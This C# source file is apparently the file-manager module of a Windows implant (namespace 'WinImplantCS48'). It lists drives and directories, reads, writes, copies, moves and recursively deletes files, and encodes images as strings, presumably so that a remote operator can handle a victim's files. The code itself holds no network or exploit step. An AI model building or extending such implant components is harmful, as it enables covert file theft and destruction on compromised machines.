using Org.BouncyCastle.Asn1.X509;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinImplantCS48
{
    public class clsfnFileMgr
    {
        public string m_szInitFileDir { get; set; }

        public struct stFileInfo
        {
            public bool bIsDir { get; set; }
            public string szFilePath { get; set; }
            public string szPermission { get; set; }
            public long nFileSize { get; set; }
            public string szCreationDate { get; set; }
            public string szLastModified { get; set; }
            public string szLastAccessed { get; set; }
        }

        public clsfnFileMgr()
        {
            m_szInitFileDir = Application.StartupPath;
        }

        public List<stFileInfo> fnScandir(string szDirPath)
        {
            List<stFileInfo> lsDir = new List<stFileInfo>();
            List<stFileInfo> lsFile = new List<stFileInfo>();

            foreach (string szDir in Directory.GetDirectories(szDirPath))
            {
                DirectoryInfo info = new DirectoryInfo(szDir);
                lsDir.Add(new stFileInfo()
                {
                    bIsDir = true,
                    szFilePath = info.FullName,
                    nFileSize = 0,
                    szPermission = "X",
                    szCreationDate = info.CreationTime.ToString("F"),
                    szLastModified = info.LastWriteTime.ToString("F"),
                    szLastAccessed = info.LastAccessTime.ToString("F"),
                });
            }

            foreach (string szFileName in Directory.GetFiles(szDirPath))
            {
                FileInfo info = new FileInfo(szFileName);
                FileAttributes attr = File.GetAttributes(szFileName);
                bool bIsReadOnly = (attr & FileAttributes.ReadOnly) == FileAttributes.ReadOnly;

                lsFile.Add(new stFileInfo()
                {
                    bIsDir = false,
                    szFilePath = info.FullName,
                    nFileSize = info.Length,
                    szPermission = bIsReadOnly ? "R" : "RW",
                    szCreationDate = info.CreationTime.ToString("F"),
                    szLastModified = info.LastWriteTime.ToString("F"),
                    szLastAccessed = info.LastAccessTime.ToString("F"),
                });
            }

            List<stFileInfo> lsResult = new List<stFileInfo>();
            lsResult.AddRange(lsDir);
            lsResult.AddRange(lsFile);

            return lsResult;
        }

        public List<string> fnlsGetDrives()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            return drives.Select(x => x.Name.Replace("\\", string.Empty)).ToList();
        }

        public (int nCode, string szContent) fnReadFile(string szFilePath)
        {
            try
            {
                return (1, File.ReadAllText(szFilePath));
            }
            catch (Exception ex)
            {
                return (0, ex.Message);
            }
        }

        public (int nCode, string szContent) fnWriteFile(string szFilePath, string szFileContent)
        {
            try
            {
                File.WriteAllText(szFilePath, szFileContent);
                return (1, szFilePath);
            }
            catch (Exception ex)
            {
                return (0, ex.Message);
            }
        }

        public (int nCode, string szMsg) fnReadImage(string szFilePath)
        {
            try
            {
                Image image = Image.FromFile(szFilePath);
                return (1, clsTools.fnszImageToString(image));
            }
            catch (Exception ex)
            {
                return (0, ex.Message);
            }
        }

        public (int nCode, string szMsg) fnCopy(string szSrcPath, string szDstPath)
        {

            void fnCopyRecursively(DirectoryInfo source, DirectoryInfo target)
            {
                foreach (DirectoryInfo dir in source.GetDirectories())
                    fnCopyRecursively(dir, target.CreateSubdirectory(dir.Name));
                foreach (FileInfo file in source.GetFiles())
                    file.CopyTo(Path.Combine(target.FullName, file.Name));
            }

            try
            {
                if (Directory.Exists(szSrcPath))
                    fnCopyRecursively(new DirectoryInfo(szSrcPath), new DirectoryInfo(szDstPath));
                else if (File.Exists(szSrcPath))
                    File.Copy(szSrcPath, szDstPath);
                else
                    throw new Exception("Copy failed.");

                return (1, string.Empty);
            }
            catch (Exception ex)
            {
                return (0, ex.Message);
            }
        }

        public (int nCode, string szMsg) fnMove(string szSrcPath, string szDstPath)
        {
            try
            {
                if (Directory.Exists(szSrcPath))
                    Directory.Move(szSrcPath, szDstPath);
                else if (File.Exists(szSrcPath))
                    File.Move(szSrcPath, szDstPath);
                else
                    throw new Exception("Move failed.");

                return (1, string.Empty);
            }
            catch (Exception ex)
            {
                return (0, ex.Message);
            }
        }

        public (int nCode, string szMsg) fnDelete(string szPath)
        {
            try
            {
                if (File.Exists(szPath))
                    File.Delete(szPath);
                else if (Directory.Exists(szPath))
                    Directory.Delete(szPath, true);
                else
                    throw new Exception("Not found: " + szPath);

                return (1, szPath);
            }
            catch (Exception ex)
            {
                return (0, ex.Message);
            }
        }
    }
}
